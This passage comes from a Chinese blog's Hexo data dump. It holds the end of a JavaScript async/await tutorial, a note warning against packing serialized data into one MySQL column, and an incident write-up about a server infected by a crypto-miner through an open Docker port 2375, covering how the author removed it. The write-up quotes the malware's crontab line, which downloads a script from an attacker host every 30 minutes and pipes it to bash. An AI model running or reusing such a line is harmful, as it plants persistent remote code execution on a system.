<span class=\"token keyword\">return</span> p<span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span>\n   <span class=\"token comment\">//延时函数，用于给请求计时</span>\n   <span class=\"token keyword\">function</span> <span class=\"token function\">timeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n       <span class=\"token keyword\">var</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n           <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n               <span class=\"token function\">reject</span><span class=\"token punctuation\">(</span><span class=\"token string\">'图片请求超时'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span>\n   Promise<span class=\"token punctuation\">.</span><span class=\"token function\">race</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token function\">requestImg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">timeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span>\n       console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">err</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n       console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ul>\n<h3 id=\"async-x2F-await\"><a href=\"#async-x2F-await\" class=\"headerlink\" title=\"async&#x2F;await\"></a>async&#x2F;await</h3><p>实际上他们是基于promise实现的，它们的作用就是让你异步执行的代码同步</p>\n<blockquote>\n<p>async用来修饰一个方法，在async修饰的方法中可以使用await来修饰一个方法的调用。</p>\n<p>有点类似于kotlin协程中的suspend 挂起函数 与 Deffered#await方法</p>\n<p>但js可没有什么乱七八糟的协程作用域和上下文，毕竟这些实际上都是在单线程环境下运行的</p>\n</blockquote>\n<p><strong>举个栗子</strong></p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// await修饰符只能影响像这样返回一个promise的函数和被async修饰的函数</span>\n<span class=\"token keyword\">const</span> <span class=\"token function-variable function\">step</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">size<span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">,</span> ele</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n            ele<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>marginLeft <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>size<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">px</span><span class=\"token template-punctuation string\">`</span></span>\n            <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 这里await会让原本异步的方法同步，也就是这里step方法彻底执行完毕才会进入下一次循环</span>\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">asyncAnimation</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">id</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">const</span> ele <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">200</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">await</span> <span class=\"token function\">step</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> ele<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 顺序执行任务队列</span>\n<span class=\"token comment\">// 让异步队列同步执行</span>\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">awaitAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">await</span> <span class=\"token function\">asyncAnimation</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"one\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">await</span> <span class=\"token function\">asyncAnimation</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"two\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">await</span> <span class=\"token function\">asyncAnimation</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"three\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token function\">awaitAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"一点小彩蛋\"><a href=\"#一点小彩蛋\" class=\"headerlink\" title=\"一点小彩蛋\"></a>一点小彩蛋</h4><h5 id=\"top-await\"><a href=\"#top-await\" class=\"headerlink\" title=\"top await\"></a>top await</h5><p>来自路姐姐的指导（</p>\n<blockquote>\n<p>在引用时加一串type&#x3D;”module” </p>\n<p>可以导入JS模块（下学期内容），还可以使用一些其他JS的新特性，比如 top await，这时 await 就不需要放在 async 函数里才能执行了</p>\n<p>路姐的优雅代码 彳亍</p>\n</blockquote>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>optimize/script.js<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>module<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">defer</span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>然后就可以直接在外部调用await</p>\n<p>让我们看看路姐的优雅のcode</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> p <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">'p'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">const</span> content <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">元丰六年十月十二日夜，解衣欲睡，月色入户\n，欣然起行。念无与为乐者，遂至承天寺寻张怀民。怀民亦未寝，相与步于中庭。\n庭下如积水空明，水中藻、荇交横，盖竹柏影也。何夜无月？何处无竹柏？但少闲人如吾两人者耳。\n</span><span class=\"token template-punctuation string\">`</span></span>\n\n<span class=\"token comment\">// 这个函数可以达到类似Java在子线程中调用Thread.sleep的效果</span>\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">ms</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> ms<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> content<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    p<span class=\"token punctuation\">.</span>textContent <span class=\"token operator\">=</span> content<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">await</span> <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这样写就非常彳亍了</p>\n<h5 id=\"css自带的动画\"><a href=\"#css自带的动画\" class=\"headerlink\" title=\"css自带的动画\"></a>css自带的动画</h5><pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">.circle</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 100px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 100px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">border-radius</span><span class=\"token punctuation\">:</span> 100%<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">transition</span><span class=\"token punctuation\">:</span> all 1s<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token selector\">.circle.at-end</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token property\">transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">translateX</span><span class=\"token punctuation\">(</span>200px<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>transition: all 1s; 被加上了这一条，位置的改变会有一个丝滑的动画，而1s这个参数决定了移动的时间。</p>\n"},{"title":"在使用SQL时的一些注意事项","date":"2021-07-22T15:14:42.000Z","author":"寒雨","hide":false,"summary":"记录一下使用MySQL的一些注意事项","_content":"\n## 尽量避免将大量数据序列化扔一个列里\n\n**尤其是在需要频繁获取/更新这些数据的情况下**\n这样一旦数据库储量到达一定级别，**数据库极可能丢失数据**\n神域的地牢孤剑便是前车之鉴\n**储存方式**\n\n[![7e8c1fed3737e6ab](https://user-images.githubusercontent.com/69996135/126663341-3692ff72-388d-4dea-a216-4021943b5437.png)](https://user-images.githubusercontent.com/69996135/126663341-3692ff72-388d-4dea-a216-4021943b5437.png)\n\n**后果**\n\n[![-2bf7c04dec497124](https://user-images.githubusercontent.com/69996135/126663530-030ca6e0-e7eb-456c-88d0-3ea803a609c0.jpg)](https://user-images.githubusercontent.com/69996135/126663530-030ca6e0-e7eb-456c-88d0-3ea803a609c0.jpg)\n\n[![-3e6ca3264d9d5b3a](https://user-images.githubusercontent.com/69996135/126663547-64e62179-46ca-4696-9fa6-044f57c804f7.jpg)](https://user-images.githubusercontent.com/69996135/126663547-64e62179-46ca-4696-9fa6-044f57c804f7.jpg)\n\n[![54e384ac658f35d9](https://user-images.githubusercontent.com/69996135/126663565-d42a10e9-b5fd-42d6-bb34-edc6aef0d993.jpg)](https://user-images.githubusercontent.com/69996135/126663565-d42a10e9-b5fd-42d6-bb34-edc6aef0d993.jpg)\n\n**知乎**\n[![1c4ec094fffaaa6a](https://user-images.githubusercontent.com/69996135/126663612-d738f9d0-ea64-4a05-bc5d-eb6d5917c496.png)](https://user-images.githubusercontent.com/69996135/126663612-d738f9d0-ea64-4a05-bc5d-eb6d5917c496.png)\n[![-1edc645b674852e1](https://user-images.githubusercontent.com/69996135/126663622-aea138f4-716b-4186-9ce1-7e531b8e57ce.png)](https://user-images.githubusercontent.com/69996135/126663622-aea138f4-716b-4186-9ce1-7e531b8e57ce.png)\n[![-5462c585fd3183db](https://user-images.githubusercontent.com/69996135/126663631-0c50a072-f1c2-4fc9-9d39-887138cb3048.png)](https://user-images.githubusercontent.com/69996135/126663631-0c50a072-f1c2-4fc9-9d39-887138cb3048.png)","source":"_posts/be-careful-using-mysql.md","raw":"---\ntitle: 在使用SQL时的一些注意事项\ndate: 2021-07-22 23:14:42\nauthor: 寒雨\nhide: false\nsummary: 记录一下使用MySQL的一些注意事项\ncategories: 笔记\ntags:\n  - MySQL\n---\n\n## 尽量避免将大量数据序列化扔一个列里\n\n**尤其是在需要频繁获取/更新这些数据的情况下**\n这样一旦数据库储量到达一定级别，**数据库极可能丢失数据**\n神域的地牢孤剑便是前车之鉴\n**储存方式**\n\n[![7e8c1fed3737e6ab](https://user-images.githubusercontent.com/69996135/126663341-3692ff72-388d-4dea-a216-4021943b5437.png)](https://user-images.githubusercontent.com/69996135/126663341-3692ff72-388d-4dea-a216-4021943b5437.png)\n\n**后果**\n\n[![-2bf7c04dec497124](https://user-images.githubusercontent.com/69996135/126663530-030ca6e0-e7eb-456c-88d0-3ea803a609c0.jpg)](https://user-images.githubusercontent.com/69996135/126663530-030ca6e0-e7eb-456c-88d0-3ea803a609c0.jpg)\n\n[![-3e6ca3264d9d5b3a](https://user-images.githubusercontent.com/69996135/126663547-64e62179-46ca-4696-9fa6-044f57c804f7.jpg)](https://user-images.githubusercontent.com/69996135/126663547-64e62179-46ca-4696-9fa6-044f57c804f7.jpg)\n\n[![54e384ac658f35d9](https://user-images.githubusercontent.com/69996135/126663565-d42a10e9-b5fd-42d6-bb34-edc6aef0d993.jpg)](https://user-images.githubusercontent.com/69996135/126663565-d42a10e9-b5fd-42d6-bb34-edc6aef0d993.jpg)\n\n**知乎**\n[![1c4ec094fffaaa6a](https://user-images.githubusercontent.com/69996135/126663612-d738f9d0-ea64-4a05-bc5d-eb6d5917c496.png)](https://user-images.githubusercontent.com/69996135/126663612-d738f9d0-ea64-4a05-bc5d-eb6d5917c496.png)\n[![-1edc645b674852e1](https://user-images.githubusercontent.com/69996135/126663622-aea138f4-716b-4186-9ce1-7e531b8e57ce.png)](https://user-images.githubusercontent.com/69996135/126663622-aea138f4-716b-4186-9ce1-7e531b8e57ce.png)\n[![-5462c585fd3183db](https://user-images.githubusercontent.com/69996135/126663631-0c50a072-f1c2-4fc9-9d39-887138cb3048.png)](https://user-images.githubusercontent.com/69996135/126663631-0c50a072-f1c2-4fc9-9d39-887138cb3048.png)","slug":"be-careful-using-mysql","published":1,"updated":"2021-11-13T16:16:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jt4000bsfkl6j730i2d","content":"<h2 id=\"尽量避免将大量数据序列化扔一个列里\"><a href=\"#尽量避免将大量数据序列化扔一个列里\" class=\"headerlink\" title=\"尽量避免将大量数据序列化扔一个列里\"></a>尽量避免将大量数据序列化扔一个列里</h2><p><strong>尤其是在需要频繁获取/更新这些数据的情况下</strong><br>这样一旦数据库储量到达一定级别，<strong>数据库极可能丢失数据</strong><br>神域的地牢孤剑便是前车之鉴<br><strong>储存方式</strong></p>\n<p><a href=\"https://user-images.githubusercontent.com/69996135/126663341-3692ff72-388d-4dea-a216-4021943b5437.png\"><img src=\"https://user-images.githubusercontent.com/69996135/126663341-3692ff72-388d-4dea-a216-4021943b5437.png\" alt=\"7e8c1fed3737e6ab\"></a></p>\n<p><strong>后果</strong></p>\n<p><a href=\"https://user-images.githubusercontent.com/69996135/126663530-030ca6e0-e7eb-456c-88d0-3ea803a609c0.jpg\"><img src=\"https://user-images.githubusercontent.com/69996135/126663530-030ca6e0-e7eb-456c-88d0-3ea803a609c0.jpg\" alt=\"-2bf7c04dec497124\"></a></p>\n<p><a href=\"https://user-images.githubusercontent.com/69996135/126663547-64e62179-46ca-4696-9fa6-044f57c804f7.jpg\"><img src=\"https://user-images.githubusercontent.com/69996135/126663547-64e62179-46ca-4696-9fa6-044f57c804f7.jpg\" alt=\"-3e6ca3264d9d5b3a\"></a></p>\n<p><a href=\"https://user-images.githubusercontent.com/69996135/126663565-d42a10e9-b5fd-42d6-bb34-edc6aef0d993.jpg\"><img src=\"https://user-images.githubusercontent.com/69996135/126663565-d42a10e9-b5fd-42d6-bb34-edc6aef0d993.jpg\" alt=\"54e384ac658f35d9\"></a></p>\n<p><strong>知乎</strong><br><a href=\"https://user-images.githubusercontent.com/69996135/126663612-d738f9d0-ea64-4a05-bc5d-eb6d5917c496.png\"><img src=\"https://user-images.githubusercontent.com/69996135/126663612-d738f9d0-ea64-4a05-bc5d-eb6d5917c496.png\" alt=\"1c4ec094fffaaa6a\"></a><br><a href=\"https://user-images.githubusercontent.com/69996135/126663622-aea138f4-716b-4186-9ce1-7e531b8e57ce.png\"><img src=\"https://user-images.githubusercontent.com/69996135/126663622-aea138f4-716b-4186-9ce1-7e531b8e57ce.png\" alt=\"-1edc645b674852e1\"></a><br><a href=\"https://user-images.githubusercontent.com/69996135/126663631-0c50a072-f1c2-4fc9-9d39-887138cb3048.png\"><img src=\"https://user-images.githubusercontent.com/69996135/126663631-0c50a072-f1c2-4fc9-9d39-887138cb3048.png\" alt=\"-5462c585fd3183db\"></a></p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h2 id=\"尽量避免将大量数据序列化扔一个列里\"><a href=\"#尽量避免将大量数据序列化扔一个列里\" class=\"headerlink\" title=\"尽量避免将大量数据序列化扔一个列里\"></a>尽量避免将大量数据序列化扔一个列里</h2><p><strong>尤其是在需要频繁获取&#x2F;更新这些数据的情况下</strong><br>这样一旦数据库储量到达一定级别，<strong>数据库极可能丢失数据</strong><br>神域的地牢孤剑便是前车之鉴<br><strong>储存方式</strong></p>\n<p><a href=\"https://user-images.githubusercontent.com/69996135/126663341-3692ff72-388d-4dea-a216-4021943b5437.png\"><img src=\"https://user-images.githubusercontent.com/69996135/126663341-3692ff72-388d-4dea-a216-4021943b5437.png\" alt=\"7e8c1fed3737e6ab\"></a></p>\n<p><strong>后果</strong></p>\n<p><a href=\"https://user-images.githubusercontent.com/69996135/126663530-030ca6e0-e7eb-456c-88d0-3ea803a609c0.jpg\"><img src=\"https://user-images.githubusercontent.com/69996135/126663530-030ca6e0-e7eb-456c-88d0-3ea803a609c0.jpg\" alt=\"-2bf7c04dec497124\"></a></p>\n<p><a href=\"https://user-images.githubusercontent.com/69996135/126663547-64e62179-46ca-4696-9fa6-044f57c804f7.jpg\"><img src=\"https://user-images.githubusercontent.com/69996135/126663547-64e62179-46ca-4696-9fa6-044f57c804f7.jpg\" alt=\"-3e6ca3264d9d5b3a\"></a></p>\n<p><a href=\"https://user-images.githubusercontent.com/69996135/126663565-d42a10e9-b5fd-42d6-bb34-edc6aef0d993.jpg\"><img src=\"https://user-images.githubusercontent.com/69996135/126663565-d42a10e9-b5fd-42d6-bb34-edc6aef0d993.jpg\" alt=\"54e384ac658f35d9\"></a></p>\n<p><strong>知乎</strong><br><a href=\"https://user-images.githubusercontent.com/69996135/126663612-d738f9d0-ea64-4a05-bc5d-eb6d5917c496.png\"><img src=\"https://user-images.githubusercontent.com/69996135/126663612-d738f9d0-ea64-4a05-bc5d-eb6d5917c496.png\" alt=\"1c4ec094fffaaa6a\"></a><br><a href=\"https://user-images.githubusercontent.com/69996135/126663622-aea138f4-716b-4186-9ce1-7e531b8e57ce.png\"><img src=\"https://user-images.githubusercontent.com/69996135/126663622-aea138f4-716b-4186-9ce1-7e531b8e57ce.png\" alt=\"-1edc645b674852e1\"></a><br><a href=\"https://user-images.githubusercontent.com/69996135/126663631-0c50a072-f1c2-4fc9-9d39-887138cb3048.png\"><img src=\"https://user-images.githubusercontent.com/69996135/126663631-0c50a072-f1c2-4fc9-9d39-887138cb3048.png\" alt=\"-5462c585fd3183db\"></a></p>\n"},{"title":"记一次服务器遭到挖矿病毒感染的经历","date":"2022-05-16T16:00:00.000Z","author":"寒雨","hide":false,"summary":"2375端口真不能开，开了就中招","_content":"\n# 记一次服务器遭到挖矿病毒感染的经历\n\n## 起因\n\n在鼓捣docker，看了一些教程，为了方便一些操作打开了2375端口，导致被人docker注入了。\n\n## 应对过程\n\n其实我之前完全没有面对过服务器遭到病毒攻击的问题...最开始是腾讯云给我发短信，说我的服务器存在危险行为，并且封禁了这台服务器一天。\n\n当时一上去我就感觉到不对了，服务器上经常莫名奇妙多一个docker镜像，删了也没用。\n\n后面我使用`crontab -l`排查了一下定时任务，发现里面有一个奇怪的任务。\n\n~~~sh\n*/30 * * * * /usr/bin/cdz -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | bash > /dev/null 2>&1\n~~~\n\n看样子这就是问题所在了，它会定时下载一个脚本文件并且执行。那么只要把它删掉不就完事大吉了？\n\n于是我试图用`crontab -e`删掉它，最后却发现无法编辑这个配置。\n\n> \"/tmp/crontab.Awo30z\" 1L, 1C written\n> crontab: installing new crontab\n> /var/spool/cron/#tmp.VM-16-8-centos.XXXX6iXbXz: Operation not permitted\n> crontab: edits left in /tmp/crontab.Awo30z\n\n病毒怎么可能会让你轻松的删掉这个定时任务？它修改了文件的属性，让它无法被修改——即便你拥有root的最高权限。\n\n百度后找到了解决方案\n\n>  查看是否有特殊的属性 lsattr /var/spool/cron/ \n>\n>  去掉特殊的属性 chattr -ai /var/spool/cron/root  && lsattr /var/spool/cron/root\n\n但是有一点很奇怪，我的腾讯云机器上无法使用chattr指令。他会询问我是否安装一个包，但真安装时却说这个包已经安装过了，不知道这是不是病毒搞得鬼。\n\n> [root@VM-16-8-centos lighthouse]# chattr -i /var/spool/cron\n> bash: chattr: command not found...\n> Install package 'e2fsprogs' to provide command 'chattr'? [N/y] y  \n>\n>\n>  * Waiting in queue... Failed to install packages: e2fsprogs-1.45.6-2.tl3.x86_64 is already installed\n\n于是我把包给卸载重装了一次，就可以了\n\n> yum remove e2fsprogs-1.45.6-2.tl3.x86_64\n\n去除特殊权限后就可以编辑定时任务了。","source":"_posts/deal-with-viruses-in-the-server.md","raw":"---\ntitle: 记一次服务器遭到挖矿病毒感染的经历\ndate: 2022-05-17\nauthor: 寒雨\nhide: false\nsummary: 2375端口真不能开，开了就中招\ncategories: 杂谈\ntags:\n  - 运维\n---\n\n# 记一次服务器遭到挖矿病毒感染的经历\n\n## 起因\n\n在鼓捣docker，看了一些教程，为了方便一些操作打开了2375端口，导致被人docker注入了。\n\n## 应对过程\n\n其实我之前完全没有面对过服务器遭到病毒攻击的问题...最开始是腾讯云给我发短信，说我的服务器存在危险行为，并且封禁了这台服务器一天。\n\n当时一上去我就感觉到不对了，服务器上经常莫名奇妙多一个docker镜像，删了也没用。\n\n后面我使用`crontab -l`排查了一下定时任务，发现里面有一个奇怪的任务。\n\n~~~sh\n*/30 * * * * /usr/bin/cdz -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | bash > /dev/null 2>&1\n~~~\n\n看样子这就是问题所在了，它会定时下载一个脚本文件并且执行。那么只要把它删掉不就完事大吉了？\n\n于是我试图用`crontab -e`删掉它，最后却发现无法编辑这个配置。\n\n> \"/tmp/crontab.Awo30z\" 1L, 1C written\n> crontab: installing new crontab\n> /var/spool/cron/#tmp.VM-16-8-centos.XXXX6iXbXz: Operation not permitted\n> crontab: edits left in /tmp/crontab.Awo30z\n\n病毒怎么可能会让你轻松的删掉这个定时任务？它修改了文件的属性，让它无法被修改——即便你拥有root的最高权限。\n\n百度后找到了解决方案\n\n>  查看是否有特殊的属性 lsattr /var/spool/cron/ \n>\n>  去掉特殊的属性 chattr -ai /var/spool/cron/root  && lsattr /var/spool/cron/root\n\n但是有一点很奇怪，我的腾讯云机器上无法使用chattr指令。他会询问我是否安装一个包，但真安装时却说这个包已经安装过了，不知道这是不是病毒搞得鬼。\n\n> [root@VM-16-8-centos lighthouse]# chattr -i /var/spool/cron\n> bash: chattr: command not found...\n> Install package 'e2fsprogs' to provide command 'chattr'? [N/y] y  \n>\n>\n>  * Waiting in queue... Failed to install packages: e2fsprogs-1.45.6-2.tl3.x86_64 is already installed\n\n于是我把包给卸载重装了一次，就可以了\n\n> yum remove e2fsprogs-1.45.6-2.tl3.x86_64\n\n去除特殊权限后就可以编辑定时任务了。","slug":"deal-with-viruses-in-the-server","published":1,"updated":"2022-11-24T03:03:11.732Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jt6000gsfklaesxe5wv","content":"<h1 id=\"记一次服务器遭到挖矿病毒感染的经历\"><a href=\"#记一次服务器遭到挖矿病毒感染的经历\" class=\"headerlink\" title=\"记一次服务器遭到挖矿病毒感染的经历\"></a>记一次服务器遭到挖矿病毒感染的经历</h1><h2 id=\"起因\"><a href=\"#起因\" class=\"headerlink\" title=\"起因\"></a>起因</h2><p>在鼓捣docker，看了一些教程，为了方便一些操作打开了2375端口，导致被人docker注入了。</p>\n<h2 id=\"应对过程\"><a href=\"#应对过程\" class=\"headerlink\" title=\"应对过程\"></a>应对过程</h2><p>其实我之前完全没有面对过服务器遭到病毒攻击的问题…最开始是腾讯云给我发短信，说我的服务器存在危险行为，并且封禁了这台服务器一天。</p>\n<p>当时一上去我就感觉到不对了，服务器上经常莫名奇妙多一个docker镜像，删了也没用。</p>\n<p>后面我使用<code>crontab -l</code>排查了一下定时任务，发现里面有一个奇怪的任务。</p>\n<pre class=\"line-numbers language-sh\" data-language=\"sh\"><code class=\"language-sh\">*/30 * * * * /usr/bin/cdz -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | bash &gt; /dev/null 2&gt;&amp;1<span aria-hidden=\"true\" 